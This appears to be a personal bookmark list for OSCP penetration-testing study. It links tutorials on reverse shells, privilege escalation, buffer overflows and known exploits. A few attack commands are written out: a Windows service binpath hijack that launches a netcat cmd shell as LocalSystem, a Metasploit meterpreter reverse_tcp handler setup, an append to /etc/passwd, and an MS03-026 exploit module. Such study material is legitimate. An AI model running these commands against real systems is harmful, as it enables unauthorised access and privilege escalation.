# OSCP - Journey 
** This repo consists of important links (or URLs) which were bookmarked during my journey of OSCP Certification **

!! Note !!

** Most of the links are considered to be SPOLIERS :P !!!**
                                            

# Reverse and Bind Shell tutorials

https://null-byte.wonderhowto.com/how-to/create-reverse-shell-remotely-execute-root-commands-over-any-open-port-using-netcat-bash-0132658/

http://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet (for getting PHP reverse shell) 

# Different Types of Shells (Like Php, bash, netcat ....)

https://highon.coffee/blog/reverse-shell-cheat-sheet/

# Privilege Escalation 

http://www.fuzzysecurity.com/tutorials/16.html

1. sc qc upnphost
2. sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
3. sc config upnphost obj= ".\LocalSystem" password= ""
4. sc qc upnphost
5. net start upnphost
  
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
 
# Buffer Overflow 

What is buffer-overflow
https://www.youtube.com/watch?v=TsQufuT80uc

  # For Practicing
  1. Vanilla EIP 
http://www.primalsecurity.net/0x0-exploit-tutorial-buffer-overflow-vanilla-eip-overwrite-2/
  2. SL Mail
https://www.youtube.com/watch?v=Pi51KlEulj4
 
# MD5 Decrypter 
https://hashkiller.co.uk/md5-decrypter.aspx

# For RPC Service 
https://null-byte.wonderhowto.com/how-to/hack-like-pro-exploit-and-gain-remote-access-pcs-running-windows-xp-0134709/

# Extra Toppings

https://pinboard.in/u:unfo/t:oscp

# LFI _ Practise 

1. Coldfusion
http://hatriot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/

https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers

# Using Multihandler
msf>use exploit multi/handler
msf>set payload windows/meterpreter/reverse_tcp
msf>set lhost <local IP>
msf>set lport <local port>
msf> set ExitOnSession false
msf>exploit -j

# append users in /etc/passwd

echo "line:to:add" >> /etc/passwd

# MSF Payloads

https://netsec.ws/?p=331

http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/

# Privilege Escalation
  1. Linux Kernel 2.6.22 < 3.9 --> Dirty Cow
  
https://www.exploit-db.com/exploits/40839/
https://www.youtube.com/watch?v=iyhbLeOzegM

# OpenFuck / NT SNT Samba Server / Trans2open

https://kongwenbin.wordpress.com/tag/openfuck/

# Phplite_admin 1.9.3

https://www.youtube.com/watch?v=G1i5oWblx9Q

# ManageEngine Multiple Products Authenticated File Upload

https://www.rapid7.com/db/modules/exploit/multi/http/manageengine_auth_upload

# ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow

https://www.rapid7.com/db/modules/exploit/linux/ftp/proftp_telnet_iac

# Oracle 9i XDB - HTTP PASS Overflow

https://www.exploit-db.com/exploits/16809/


To be Cont.......










  
  > use exploit/windows/dcerpc/ms03_026_dcom
  

